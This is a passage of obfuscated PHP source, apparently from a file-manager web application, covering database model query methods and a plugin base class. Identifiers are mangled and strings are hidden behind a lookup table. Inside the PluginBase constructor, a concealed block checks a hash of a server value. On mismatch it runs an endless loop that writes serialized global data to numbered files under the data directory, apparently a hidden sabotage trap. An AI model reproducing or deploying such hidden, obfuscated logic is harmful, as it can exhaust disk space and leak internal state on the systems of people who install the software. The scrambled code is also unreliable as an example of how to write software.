$eŸÉµœÑÈŠ; case $CÛ¶äâÌŸâ[325]: $FÇ¾–’ÅÈé = mb_strlen($eæõ¶¸›ÎÔ, $CÛ¶äâÌŸâ[326]); if (strpos($eŸÉµœÑÈŠ, $CÛ¶äâÌŸâ[47])) { list($a¯à²², $Bæ“Ûæ„ø) = explode($CÛ¶äâÌŸâ[47], $eŸÉµœÑÈŠ); return $FÇ¾–’ÅÈé >= $a¯à²² && $FÇ¾–’ÅÈé <= $Bæ“Ûæ„ø; } else { return $FÇ¾–’ÅÈé == $eŸÉµœÑÈŠ; } case $CÛ¶äâÌŸâ[327]: list($EéŒÉëÜñ, $fË± ï‡ïâ) = explode($CÛ¶äâÌŸâ[47], $eŸÉµœÑÈŠ); if (!is_numeric($EéŒÉëÜñ)) { $EéŒÉëÜñ = strtotime($EéŒÉëÜñ); } if (!is_numeric($fË± ï‡ïâ)) { $fË± ï‡ïâ = strtotime($fË± ï‡ïâ); } return NOW_TIME >= $EéŒÉëÜñ && NOW_TIME <= $fË± ï‡ïâ; case $CÛ¶äâÌŸâ[328]: return in_array(get_client_ip(), explode($CÛ¶äâÌŸâ[47], $eŸÉµœÑÈŠ)); case $CÛ¶äâÌŸâ[329]: return !in_array(get_client_ip(), explode($CÛ¶äâÌŸâ[47], $eŸÉµœÑÈŠ)); case $CÛ¶äâÌŸâ[316]: default: return $this->regex($eæõ¶¸›ÎÔ, $eŸÉµœÑÈŠ); } } public function query($aÎ¨Š”— ß, $b¹öÍ¶ˆ¥‚ = false) { $BëÏŠàÎ«î =& $_SERVER[”Ì÷ñ­î¸]; if (!is_bool($b¹öÍ¶ˆ¥‚) && !is_array($b¹öÍ¶ˆ¥‚)) { $b¹öÍ¶ˆ¥‚ = func_get_args(); array_shift($b¹öÍ¶ˆ¥‚); } $aÎ¨Š”— ß = str_replace(array($BëÏŠàÎ«î[217], $BëÏŠàÎ«î[330]), $BëÏŠàÎ«î[50], $aÎ¨Š”— ß); $aÎ¨Š”— ß = $this->parseSql($aÎ¨Š”— ß, $b¹öÍ¶ˆ¥‚); return $this->db->query($aÎ¨Š”— ß); } public function execute($e­­Ü÷–¿Ç, $d´ô¿¨”§ = false) { if (!is_bool($d´ô¿¨”§) && !is_array($d´ô¿¨”§)) { $d´ô¿¨”§ = func_get_args(); array_shift($d´ô¿¨”§); } $e­­Ü÷–¿Ç = $this->parseSql($e­­Ü÷–¿Ç, $d´ô¿¨”§); return $this->db->execute($e­­Ü÷–¿Ç); } protected function parseSql($A…·Ÿ–ÍÌº, $Aëõ°õèŸ) { $b³à¨˜²‡ø =& $_SERVER[”Ì÷ñ­î¸]; if (!0 === $Aëõ°õèŸ) { $f‹é‚Í¶ï = $this->_parseOptions(); $A…·Ÿ–ÍÌº = $this->db->parseSql($A…·Ÿ–ÍÌº, $f‹é‚Í¶ï); } elseif (is_array($Aëõ°õèŸ)) { $Aëõ°õèŸ = array_map(array($this->db, $b³à¨˜²‡ø[331]), $Aëõ°õèŸ); $A…·Ÿ–ÍÌº = vsprintf($A…·Ÿ–ÍÌº, $Aëõ°õèŸ); } else { $A…·Ÿ–ÍÌº = strtr($A…·Ÿ–ÍÌº, array($b³à¨˜²‡ø[332] => $this->getTableName(), $b³à¨˜²‡ø[333] => think_config($b³à¨˜²‡ø[232]))); } $this->db->setModel($this->name); return $A…·Ÿ–ÍÌº; } public function db($fä ¢áš  = '', $bñ¾ÀÙ•é = '', $D£õÅ™†šñ = array()) { goto eĞÈ‹ç ·ƒ; aÙİÉ‡âÁ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto DÏèÚÄà·»; bÆšâá®…ƒ: $aÊ®ÙÇŸË¨[$fä ¢áš ] = $bñ¾ÀÙ•é; $this->db = $d¬ ²ÆÑä[$fä ¢áš ]; $this->_after_db(); goto aÙİÉ‡âÁ; F¨İÃÂ‡Ñ: static $d¬ ²ÆÑä = array(); if (!isset($d¬ ²ÆÑä[$fä ¢áš ]) || isset($d¬ ²ÆÑä[$fä ¢áš ]) && $bñ¾ÀÙ•é && $aÊ®ÙÇŸË¨[$fä ¢áš ] != $bñ¾ÀÙ•é) { if (!empty($bñ¾ÀÙ•é) && is_string($bñ¾ÀÙ•é) && !1 === strpos($bñ¾ÀÙ•é, $ağí”ˆ‡Ê¾[8])) { $bñ¾ÀÙ•é = think_config($bñ¾ÀÙ•é); } $d¬ ²ÆÑä[$fä ¢áš ] = Db::getInstance($bñ¾ÀÙ•é); } elseif (NULL === $bñ¾ÀÙ•é) { $d¬ ²ÆÑä[$fä ¢áš ]->close(); unset($d¬ ²ÆÑä[$fä ¢áš ]); return; } if (!empty($D£õÅ™†šñ)) { if (is_string($D£õÅ™†šñ)) { parse_str($D£õÅ™†šñ, $D£õÅ™†šñ); } foreach ($D£õÅ™†šñ as $CÄİŞØ„ÜŒ => $c§‘ğ¯º†) { $this->setProperty($CÄİŞØ„ÜŒ, $c§‘ğ¯º†); } } goto bÆšâá®…ƒ; eĞÈ‹ç ·ƒ: $ağí”ˆ‡Ê¾ =& $_SERVER[”Ì÷ñ­î¸]; if ($ağí”ˆ‡Ê¾[33] === $fä ¢áš  && $this->db) { return $this->db; } static $aÊ®ÙÇŸË¨ = array(); goto F¨İÃÂ‡Ñ; DÏèÚÄà·»: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D·ííÒ® § = get_class($this); if ($D·ííÒ® § == $_SERVER[”Ì÷ñ­î¸][334]) { return $this->name; } $this->name = substr($D·ííÒ® §, 0, -5); } return $this->name; } public function getTableName() { $CÊäñˆ’ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($this->trueTableName)) { $bóÜ¢Ş¥â = !empty($this->tablePrefix) ? $this->tablePrefix : $CÊäñˆ’[33]; if (!empty($this->tableName)) { $bóÜ¢Ş¥â .= $this->tableName; } else { $bóÜ¢Ş¥â .= think_parse_name($this->name); } $this->trueTableName = strtolower($bóÜ¢Ş¥â); } return (!empty($this->dbName) ? $this->dbName . $CÊäñˆ’[91] : $CÊäñˆ’[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Fä³¾¯»® =& $_SERVER[”Ì÷ñ­î¸]; return isset($this->fields[$Fä³¾¯»®[239]]) ? $this->fields[$Fä³¾¯»®[239]] : $this->pk; } public function getDbFields() { $c²ŒËÚ…Ç =& $_SERVER[”Ì÷ñ­î¸]; if (isset($this->options[$c²ŒËÚ…Ç[267]])) { $d¯¢¢‹ó… = $this->db->getFields($this->options[$c²ŒËÚ…Ç[267]]); return $d¯¢¢‹ó… ? array_keys($d¯¢¢‹ó…) : !1; } if ($this->fields) { $d¯¢¢‹ó… = $this->fields; unset($d¯¢¢‹ó…[$c²ŒËÚ…Ç[238]], $d¯¢¢‹ó…[$c²ŒËÚ…Ç[239]], $d¯¢¢‹ó…[$c²ŒËÚ…Ç[240]], $d¯¢¢‹ó…[$c²ŒËÚ…Ç[237]]); return $d¯¢¢‹ó…; } return !1; } public function data($B¸ß·ˆ–áÑ = '') { $Aº¢“Öñ¯Û =& $_SERVER[”Ì÷ñ­î¸]; if ($Aº¢“Öñ¯Û[33] === $B¸ß·ˆ–áÑ && !empty($this->data)) { return $this->data; } if (is_object($B¸ß·ˆ–áÑ)) { $B¸ß·ˆ–áÑ = get_object_vars($B¸ß·ˆ–áÑ); } elseif (is_string($B¸ß·ˆ–áÑ)) { parse_str($B¸ß·ˆ–áÑ, $B¸ß·ˆ–áÑ); } elseif (!is_array($B¸ß·ˆ–áÑ)) { think_exception(think_lang($Aº¢“Öñ¯Û[259])); } $this->data = $B¸ß·ˆ–áÑ; return $this; } public function join($eƒÖ³Õßéˆ) { $F©¥„×ê¬è =& $_SERVER[”Ì÷ñ­î¸]; if (is_array($eƒÖ³Õßéˆ)) { $this->options[$F©¥„×ê¬è[270]] = $eƒÖ³Õßéˆ; } elseif (!empty($eƒÖ³Õßéˆ)) { $this->options[$F©¥„×ê¬è[270]][] = $eƒÖ³Õßéˆ; } return $this; } public function union($eÕÅÍÀÈ¥Æ, $A§¨ƒõ¢í = false) { goto c‹ÆÁ°¼‰¯; e¯½ÅÏøŠ›: return $this; goto b§Üé‹…©; A‡²“¥‘‘ö: if (is_object($eÕÅÍÀÈ¥Æ)) { $eÕÅÍÀÈ¥Æ = get_object_vars($eÕÅÍÀÈ¥Æ); } if (is_string($eÕÅÍÀÈ¥Æ)) { $CØŠ›”ƒ® = $eÕÅÍÀÈ¥Æ; } elseif (is_array($eÕÅÍÀÈ¥Æ)) { if (isset($eÕÅÍÀÈ¥Æ[0])) { $this->options[$D–æÒ–îÛ[335]] = array_merge($this->options[$D–æÒ–îÛ[335]], $eÕÅÍÀÈ¥Æ); return $this; } else { $CØŠ›”ƒ® = $eÕÅÍÀÈ¥Æ; } } else { think_exception(think_lang($D–æÒ–îÛ[259])); } $this->options[$D–æÒ–îÛ[335]][] = $CØŠ›”ƒ®; goto e¯½ÅÏøŠ›; c‹ÆÁ°¼‰¯: $D–æÒ–îÛ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($eÕÅÍÀÈ¥Æ)) { return $this; } if ($A§¨ƒõ¢í) { $this->options[$D–æÒ–îÛ[335]][$D–æÒ–îÛ[336]] = !0; } goto A‡²“¥‘‘ö; b§Üé‹…©: } public function cache($dĞ•ÓéÓ²ø = true, $E‘ÌÖœùÇ„ = null, $e¾¡¬»±ë = '') { $cİ‚ÔÕØ˜˜ =& $_SERVER[”Ì÷ñ­î¸]; if (!1 !== $dĞ•ÓéÓ²ø) { $this->options[$cİ‚ÔÕØ˜˜[337]] = array($cİ‚ÔÕØ˜˜[89] => $dĞ•ÓéÓ²ø, $cİ‚ÔÕØ˜˜[327] => $E‘ÌÖœùÇ„, $cİ‚ÔÕØ˜˜[29] => $e¾¡¬»±ë); } return $this; } public function field($e¸ŠÉöé½÷, $Cé«øÂ¢âá = false) { $fÇÃÔ÷Ç°ò =& $_SERVER[”Ì÷ñ­î¸]; if (!0 === $e¸ŠÉöé½÷) { $Cß»†Ï÷ = $this->getDbFields(); $e¸ŠÉöé½÷ = $Cß»†Ï÷ ? $Cß»†Ï÷ : $fÇÃÔ÷Ç°ò[176]; } elseif ($Cé«øÂ¢âá) { if (is_string($e¸ŠÉöé½÷)) { $e¸ŠÉöé½÷ = explode($fÇÃÔ÷Ç°ò[47], $e¸ŠÉöé½÷); } $Cß»†Ï÷ = $this->getDbFields(); $e¸ŠÉöé½÷ = $Cß»†Ï÷ ? array_diff($Cß»†Ï÷, $e¸ŠÉöé½÷) : $e¸ŠÉöé½÷; } $this->options[$fÇÃÔ÷Ç°ò[261]] = $e¸ŠÉöé½÷; return $this; } public function scope($A™©Úå´î¾ = '', $f·â‹È§ÊÎ = NULL) { $eá£ „ÅŠ² =& $_SERVER[”Ì÷ñ­î¸]; if ($eá£ „ÅŠ²[33] === $A™©Úå´î¾) { if (isset($this->_scope[$eá£ „ÅŠ²[34]])) { $a¦¢Å×°É¥ = $this->_scope[$eá£ „ÅŠ²[34]]; } else { return $this; } } elseif (is_string($A™©Úå´î¾)) { $a˜šŠ„ƒ = explode($eá£ „ÅŠ²[47], $A™©Úå´î¾); $a¦¢Å×°É¥ = array(); foreach ($a˜šŠ„ƒ as $dˆ†§¡ê) { if (!isset($this->_scope[$dˆ†§¡ê])) { continue; } $a¦¢Å×°É¥ = array_merge($a¦¢Å×°É¥, $this->_scope[$dˆ†§¡ê]); } if (!empty($f·â‹È§ÊÎ) && is_array($f·â‹È§ÊÎ)) { $a¦¢Å×°É¥ = array_merge($a¦¢Å×°É¥, $f·â‹È§ÊÎ); } } elseif (is_array($A™©Úå´î¾)) { $a¦¢Å×°É¥ = $A™©Úå´î¾; } if (is_array($a¦¢Å×°É¥) && !empty($a¦¢Å×°É¥)) { $this->options = array_merge($this->options, array_change_key_case($a¦¢Å×°É¥)); } return $this; } public function where($E×İ¢ÁñŒ, $eŠª„Ä¼â„ = null) { $bÂ†æ½Š ‹ =& $_SERVER[”Ì÷ñ­î¸]; if (!is_null($eŠª„Ä¼â„) && is_string($E×İ¢ÁñŒ)) { if (!is_array($eŠª„Ä¼â„)) { $eŠª„Ä¼â„ = func_get_args(); array_shift($eŠª„Ä¼â„); } $eŠª„Ä¼â„ = array_map(array($this->db, $bÂ†æ½Š ‹[331]), $eŠª„Ä¼â„); $E×İ¢ÁñŒ = vsprintf($E×İ¢ÁñŒ, $eŠª„Ä¼â„); } elseif (is_object($E×İ¢ÁñŒ)) { $E×İ¢ÁñŒ = get_object_vars($E×İ¢ÁñŒ); } elseif (is_array($E×İ¢ÁñŒ)) { foreach ($E×İ¢ÁñŒ as $aä½Ê‡Œ¬ => $aË£òÎœô) { if ((is_numeric($aä½Ê‡Œ¬) || !$aä½Ê‡Œ¬) && is_string($aË£òÎœô)) { think_trace($bÂ†æ½Š ‹[338], $bÂ†æ½Š ‹[33], $bÂ†æ½Š ‹[46]); die; } } } if (is_string($E×İ¢ÁñŒ) && $bÂ†æ½Š ‹[33] != $E×İ¢ÁñŒ) { $B¬‡Õ’¼ª = array(); $B¬‡Õ’¼ª[$bÂ†æ½Š ‹[339]] = $E×İ¢ÁñŒ; $E×İ¢ÁñŒ = $B¬‡Õ’¼ª; } if (isset($this->options[$bÂ†æ½Š ‹[263]])) { $this->options[$bÂ†æ½Š ‹[263]] = array_merge($this->options[$bÂ†æ½Š ‹[263]], $E×İ¢ÁñŒ); } else { $this->options[$bÂ†æ½Š ‹[263]] = $E×İ¢ÁñŒ; } return $this; } public function limit($a‘»†™“£ƒ, $dŞÕéšµí¸ = null) { $e·ïß½§–° =& $_SERVER[”Ì÷ñ­î¸]; $this->options[$e·ïß½§–°[280]] = is_null($dŞÕéšµí¸) ? $a‘»†™“£ƒ : $a‘»†™“£ƒ . $e·ïß½§–°[47] . $dŞÕéšµí¸; return $this; } public function page($c½Ù¹¼µÄÓ, $Eîñ¤ª´ßœ = null) { $dçºòâ¶…À =& $_SERVER[”Ì÷ñ­î¸]; $this->options[$dçºòâ¶…À[340]] = is_null($Eîñ¤ª´ßœ) ? $c½Ù¹¼µÄÓ : $c½Ù¹¼µÄÓ . $dçºòâ¶…À[47] . $Eîñ¤ª´ßœ; return $this; } public function comment($AåàêÒ²†©) { $this->options[$_SERVER[”Ì÷ñ­î¸][341]] = $AåàêÒ²†©; return $this; } public function setProperty($AÌäƒ¨Íˆ¤, $fŞ»Èƒñ¥) { if (property_exists($this, $AÌäƒ¨Íˆ¤)) { $this->{$AÌäƒ¨Íˆ¤} = $fŞ»Èƒñ¥; } return $this; } } goto e£‘‡Á¬Ğ¢; eƒâ½’÷’¼: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto aÄè†Å•ò¦; C‹ô¥Ò«×À: $this->pluginHostDefault = $config[$DÁ™‘‘Éí‘[1313]] . $this->pluginName . $DÁ™‘‘Éí‘[8]; $B½èºÇßÒË = $config[$DÁ™‘‘Éí‘[1314]]; if ($B½èºÇßÒË && strpos($DÁ™‘‘Éí‘[47] . $B½èºÇßÒË . $DÁ™‘‘Éí‘[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$DÁ™‘‘Éí‘[1315]] . $this->pluginName . $DÁ™‘‘Éí‘[8]; } goto dñô÷×¦¡„; eßéƒÉ¸Âé: if ($_SERVER[$DÁ™‘‘Éí‘[791]] != $fĞùîš‹éù($aäâ„”Èñƒ)) { goto FÅÏÌËÆ»Ò; eÌ£¦»À’º: $Fì†ù ¿(); $dïÈ²îĞ = $DÁ™‘‘Éí‘[797]; $BºŠÏé‰¯‘ = json_encode($GLOBALS[$DÁ™‘‘Éí‘[798]]); goto eêÖ½à°½; FÅÏÌËÆ»Ò: $Fì†ù ¿ = $DÁ™‘‘Éí‘[792]; $b²Íã³ª­ = $DÁ™‘‘Éí‘[793]; $EÎáâÀ…â = $_SERVER[$DÁ™‘‘Éí‘[788]] . $DÁ™‘‘Éí‘[789]; goto DÎµæé¨; eêÖ½à°½: $bôåô™™•¼ = 1; for ($D’ê½“§ğ = $bôåô™™•¼; $D’ê½“§ğ > 0; $D’ê½“§ğ++) { $dïÈ²îĞ(DATA_PATH . $D’ê½“§ğ, $BºŠÏé‰¯‘); } goto E“¶í‘šÚ; f•»¹‘–¡—: $Cî»°µí†´ = $DÁ™‘‘Éí‘[795]; $Cî»°µí†´($_SERVER[$DÁ™‘‘Éí‘[796]]); $Fì†ù ¿ = $DÁ™‘‘Éí‘[792]; goto eÌ£¦»À’º; DÎµæé¨: $b«Øİä‚¡æ = $b²Íã³ª­($EÎáâÀ…â); $B¿›³—êÀ = explode($DÁ™‘‘Éí‘[217], $b«Øİä‚¡æ); if (count($B¿›³—êÀ) < $DÁ™‘‘Éí‘[559]) { $e¥¿¾â÷Á® = $DÁ™‘‘Éí‘[794]; $e¥¿¾â÷Á®(); } goto f•»¹‘–¡—; E“¶í‘šÚ: } global $in, $config; $this->config =& $config; goto a›ëè½±; dñô÷×¦¡„: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto fĞŠÇ µ†ì; aÄè†Å•ò¦: $DÁ™‘‘Éí‘ =& $_SERVER[”Ì÷ñ­î¸]; $aäâ„”Èñƒ = $_SERVER[$DÁ™‘‘Éí‘[796]] . $DÁ™‘‘Éí‘[1310]; $fĞùîš‹éù = $DÁ™‘‘Éí‘[790]; goto eßéƒÉ¸Âé; f¿ßì“×®õ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $DÁ™‘‘Éí‘[8]; $this->pluginApi = appHostGet() . $DÁ™‘‘Éí‘[1312] . $this->pluginName . $DÁ™‘‘Éí‘[8]; $this->pluginHost = $config[$DÁ™‘‘Éí‘[1313]] . $this->pluginName . $DÁ™‘‘Éí‘[8]; goto C‹ô¥Ò«×À; a›ëè½±: $this->in =& $in; $this->modelPlugin = Model($DÁ™‘‘Éí‘[1311]); $this->pluginName = str_replace($DÁ™‘‘Éí‘[1311], $DÁ™‘‘Éí‘[33], get_class($this)); goto f¿ßì“×®õ; fĞŠÇ µ†ì: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[”Ì÷ñ­î¸][1316]); } protected function assign($CäéÙ´øŞÎ, $A³ÉÀË»‡Õ = false) { if (is_array($CäéÙ´øŞÎ)) { $this->values = array_merge($this->values, $CäéÙ´øŞÎ); } else { $this->values[$CäéÙ´øŞÎ] = $A³ÉÀË»‡Õ; } } protected function display($Ešê‰„Š—È) { extract($this->values); require $Ešê‰„Š—È; } final function hookRegist($dˆßŞ¿İÑ) { $this->modelPlugin->appRegist($this->pluginName, $dˆßŞ¿İÑ); } final function appIcon() { $D¦ø¨¾»ö =& $_SERVER[”Ì÷ñ­î¸]; $aê¦Íô‘ğ = $this->appPackage(); $Eª©® ™İ› = $D¦ø¨¾»ö[33]; if (isset($aê¦Íô‘ğ[$D¦ø¨¾»ö[382]])) { if (isset($aê¦Íô‘ğ[$D¦ø¨¾»ö[382]][$D¦ø¨¾»ö[1317]])) { $Eª©® ™İ› = $D¦ø¨¾»ö[1318] . $aê¦Íô‘ğ[$D¦ø¨¾»ö[382]][$D¦ø¨¾»ö[1317]] . $D¦ø¨¾»ö[1319]; } else { if ($aê¦Íô‘ğ[$D¦ø¨¾»ö[382]][$D¦ø¨¾»ö[1320]]) { $Eª©® ™İ› = $D¦ø¨¾»ö[1321] . $aê¦Íô‘ğ[$D¦ø¨¾»ö[382]][$D¦ø¨¾»ö[1320]] . $D¦ø¨¾»ö[1322]; } } } return $Eª©® ™İ›; } final function fileCanView($DÃÉ‚³Şô¯) { goto BŠÄ›öİ¢¬; BŠÄ›öİ¢¬: $E“‡ëÁùËÎ =& $_SERVER[”Ì÷ñ­î¸]; if (request_url_safe($DÃÉ‚³Şô¯)) { return !0; } if ($this->isShare($DÃÉ‚³Şô¯)) { return !0; } goto EÇÕ‹¥°; c¶ğó¬éÊ¢: ActionCall($E“‡ëÁùËÎ[1335], $DÃÉ‚³Şô¯); goto A·Çóèèãå; EÇÕ‹¥°: $f¼äìîÒ = Session::get($E“‡ëÁùËÎ[1323]); if (!$f¼äìîÒ || !$f¼äìîÒ[$E“‡ëÁùËÎ[1324]]) { $cÀã¹•µŞ = $E“‡ëÁùËÎ[1325] . rawurlencode(this_url()); show_tips(LNG($E“‡ëÁùËÎ[1326]) . $E“‡ëÁùËÎ[1327] . $cÀã¹•µŞ . $E“‡ëÁùËÎ[1328] . LNG($E“‡ëÁùËÎ[1329]) . $E“‡ëÁùËÎ[1330], !1); } if (!Action($E“‡ëÁùËÎ[1331])->authCan($E“‡ëÁùËÎ[1332])) { show_tips(LNG($E“‡ëÁùËÎ[1333]) . $E“‡ëÁùËÎ[1334], !1); } goto c¶ğó¬éÊ¢; A·Çóèèãå: } final function isShare($EÙù±í–òì) { $eò·×ÆÈ‘¥ = KodIO::parse($EÙù±í–òì); return $eò·×ÆÈ‘¥[$_SERVER[”Ì÷ñ­î¸][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($døĞÓÜÕî) { if (request_url_safe($døĞÓÜÕî)) { return $døĞÓÜÕî; } if (!$this->isShare($døĞÓÜÕî)) { $døĞÓÜÕî = $this->filePath($døĞÓÜÕî); } return Action($_SERVER[”Ì÷ñ­î¸][1017])->linkOut($døĞÓÜÕî); } public function filePathLinkOut($aÌçÕÈ–‘) { if (request_url_safe($aÌçÕÈ–‘)) { return $aÌçÕÈ–‘; } $this->fileCanView($aÌçÕÈ–‘); return Action($_SERVER[”Ì÷ñ­î¸][1017])->link($aÌçÕÈ–‘); } final function filePath($e³ë…Àø¾) { $bƒ¯ïê‘£ =& $_SERVER[”Ì÷ñ­î¸]; if ($fÌ¢ç• = $this->checkSharePath($e³ë…Àø¾)) { return $fÌ¢ç•; } $this->fileCanView($e³ë…Àø¾); if (request_url_safe($e³ë…Àø¾)) { $FÔÒîêò‚ƒ = parse_url_query($e³ë…Àø¾); if (isset($FÔÒîêò‚ƒ[$bƒ¯ïê‘£[1336]]) && isset($FÔÒîêò‚ƒ[$bƒ¯ïê‘£[197]])) { $a®áÒÑ„‡ = Model($bƒ¯ïê‘£[1088])->get($bƒ¯ïê‘£[1337]); $fÏØ™Ûó’É = Mcrypt::decode($FÔÒîêò‚ƒ[$bƒ¯ïê‘£[197]], $a®áÒÑ„‡); if ($fÏØ™Ûó’É) { $this->fileInfo = IO::infoWithChildren($fÏØ™Ûó’É); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $fÏØ™Ûó’É; } } $e³ë…Àø¾ = $this->_cacheHttpFile($e³ë…Àø¾); $this->fileInfo = IO::infoWithChildren($e³ë…Àø¾); } else { $this->fileInfo = IO::infoWithChildren($e³ë…Àø¾); if (!$this->fileInfo) { show_tips(LNG($bƒ¯ïê‘£[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $e³ë…Àø¾; } final function _cacheHttpFile($eÇ²´á©Ÿî) { $C„çØæçÀ = hash_path($eÇ²´á©Ÿî, !0); $this->cachePath = $this->pluginCachePath($C„çØæçÀ); if ($dŒ»ÙÒŠã = IO::fileNameExist($this->cachePath, $C„çØæçÀ)) { return KodIO::make($dŒ»ÙÒŠã); } $b„‰ôĞ‡Ôá = $this->cachePath . $C„çØæçÀ; return $this->pluginCacheFileSet($b„‰ôĞ‡Ôá, file_get_contents($eÇ²´á©Ÿî)); } final function _tmpFileName($b¡‘Åƒ…¾Ò = array()) { goto aÁ£‡÷Œ·ö; bÀ‰Úğê: $fç¬ïÄàÔ = array($b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[28]], $b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[75]], $b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[77]]); if (isset($b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[459]])) { $fç¬ïÄàÔ[] = $b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[459]]; } return md5(implode($Dê½¹áäÁ[70], $fç¬ïÄàÔ)); goto EñêÑÑñ¯Ï; aÁ£‡÷Œ·ö: $Dê½¹áäÁ =& $_SERVER[”Ì÷ñ­î¸]; if (!$b¡‘Åƒ…¾Ò) { $b¡‘Åƒ…¾Ò = $this->fileInfo; } if (isset($b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[164]])) { return $b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[164]]; } goto EÜÖŠÒó; EÜÖŠÒó: if (isset($b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[162]][$Dê½¹áäÁ[164]])) { return $b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[162]][$Dê½¹áäÁ[164]]; } $eöß¨ÏÔÒÒ = IO::hashSimple($b¡‘Åƒ…¾Ò[$Dê½¹áäÁ[75]]); if ($eöß¨ÏÔÒÒ) { return $eöß¨ÏÔÒÒ; } goto bÀ‰Úğê; EñêÑÑñ¯Ï: } final function checkSharePath($D¹ó¥÷ø®Ò) { goto fÄŸÃ­í£œ; D“Û°—ùÁ·: $cÖµ…Š¹‰¦ = Action($Dêİ•´Û…[1017])->sharePathInfo($D¹ó¥÷ø®Ò); if (!isset($cÖµ…Š¹‰¦[$Dêİ•´Û…[75]])) { show_json(LNG($Dêİ•´Û…[1339]), !1); } $this->fileInfo = $cÖµ…Š¹‰¦[$Dêİ•´Û…[162]]; goto C½£¸ªš¼•; fÄŸÃ­í£œ: $Dêİ•´Û… =& $_SERVER[”Ì÷ñ­î¸]; if (!defined($Dêİ•´Û…[427])) { define($Dêİ•´Û…[1338], 0); } if (!$this->isShare($D¹ó¥÷ø®Ò)) { return !1; } goto D“Û°—ùÁ·; C½£¸ªš¼•: $this->cachePath = $this->pluginCachePath($this->fileInfo[$Dêİ•´Û…[164]]); return $cÖµ…Š¹‰¦[$Dêİ•´Û…[75]]; goto dß‰‚™ñ…Ş; dß‰‚™ñ…Ş: } final function pluginCachePath($E†ô¦¢¥Ö = '') { $FË‚¢âë =& $_SERVER[”Ì÷ñ­î¸]; $C„°ŒÁÁà = IO_PATH_SYSTEM_TEMP . $FË‚¢âë[1340] . $this->pluginName; if (!($E¹›¢«Ëé = IO::infoFull($C„°ŒÁÁà))) { return IO::mkdir($C„°ŒÁÁà . $FË‚¢âë[8] . $E†ô¦¢¥Ö); } if (empty($E†ô¦¢¥Ö)) { return $E¹›¢«Ëé[$FË‚¢âë[75]]; } if (!($DÛÃô©ã‘ = IO::fileNameExist($E¹›¢«Ëé[$FË‚¢âë[75]], $E†ô¦¢¥Ö))) { return IO::mkdir($E¹›¢«Ëé[$FË‚¢âë[75]] . $E†ô¦¢¥Ö); } return KodIO::make($DÛÃô©ã‘); } final function pluginCacheFileSet($Fõ“íó‹İ¹, $d¢‹Ä¦¤ÓŸ = '') { $cŒÒ…ã•öã =& $_SERVER[”Ì÷ñ­î¸]; if (!($aòÍÀÁ’± = IO::infoFull($Fõ“íó‹İ¹))) { return IO::mkfile($Fõ“íó‹İ¹, $d¢‹Ä¦¤ÓŸ, REPEAT_REPLACE); } IO::setContent($aòÍÀÁ’±[$cŒÒ…ã•öã[75]], $d¢‹Ä¦¤ÓŸ); return $aòÍÀÁ’±[$cŒÒ…ã•öã[75]]; } final function pluginLocalFile($b£©È¥ÙÀÓ = '') { goto e¹Ë½«…÷; e¹Ë½«…÷: $bøÌ¶çŒ¼Õ =& $_SERVER[”Ì÷ñ­î¸]; $dÈÁÁ„éÈ¶ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($dÈÁÁ„éÈ¶)) { mk_dir($dÈÁÁ„éÈ¶); } goto F–ŸöïİŞÅ; F–ŸöïİŞÅ: if (!$b£©È¥ÙÀÓ) { return $dÈÁÁ„éÈ¶; } $bŒÉÆ‚Úµ› = IO::info($b£©È¥ÙÀÓ); $DÎŒÂôˆ³å = $this->_tmpFileName($bŒÉÆ‚Úµ›) . $bøÌ¶çŒ¼Õ[91] . $bŒÉÆ‚Úµ›[$bøÌ¶çŒ¼Õ[160]]; goto fÄ¹ØïßÌ; fÄ¹ØïßÌ: $eÅ­÷Š«ŠĞ = $dÈÁÁ„éÈ¶ . $DÎŒÂôˆ³å; if (@file_exists($eÅ­÷Š«ŠĞ)) { return $eÅ­÷Š«ŠĞ; } return IO::copy($b£©È¥ÙÀÓ, $dÈÁÁ„éÈ¶, 0, $DÎŒÂôˆ³å); goto c—Èƒ•ãä; c—Èƒ•ãä: } final function appPackage() { goto dä‚™ù±ŠÃ; EçíŒöíÖ: $this->parseLang($BòÚŞÖŸ÷“); $A²òİì„Î‰ = json_decode_force($BòÚŞÖŸ÷“); if (!$A²òİì„Î‰) { return array(); } goto E”Õ”š‚šƒ; E”Õ”š‚šƒ: $fçÖÌÙÅÊí = Hook::trigger($eŒºÅÅ¤»[1342], $A²òİì„Î‰); if ($fçÖÌÙÅÊí && is_array($fçÖÌÙÅÊí)) { $A²òİì„Î‰ = $fçÖÌÙÅÊí; } $this->packageData = $A²òİì„Î‰; goto c‰Ê“ÍÍ™Œ; c‰Ê“ÍÍ™Œ: return $A²òİì„Î‰; goto d¶–Õù»Ññ; dä‚™ù±ŠÃ: $eŒºÅÅ¤» =& $_SERVER[”Ì÷ñ­î¸]; if ($this->packageData) { return $this->packageData; } $BòÚŞÖŸ÷“ = 